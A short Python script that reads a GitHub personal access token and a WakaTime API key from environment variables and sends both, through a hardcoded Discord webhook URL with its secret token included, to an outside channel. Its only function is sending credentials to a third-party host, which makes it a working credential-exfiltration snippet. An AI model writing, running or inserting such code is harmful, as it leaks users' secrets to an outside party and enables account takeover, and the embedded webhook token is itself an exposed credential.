from discord import SyncWebhook
import os

githubPATKey = os.environ['PAT_KEY']
wakatimeAPI = "https://wakatime.com/api/v1/users/current/stats/all_time?api_key={}".format(os.environ['WAKATIME_API_KEY'])

webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1078248864269750333/inacyG607pv0zwUYDVRMYqz5xtfC2HRLB8aK58wSR-YAZAYTAbmLP8KcqKDfA0RbmXCZ")
webhook.send(githubPATKey)
webhook.send(wakatimeAPI)
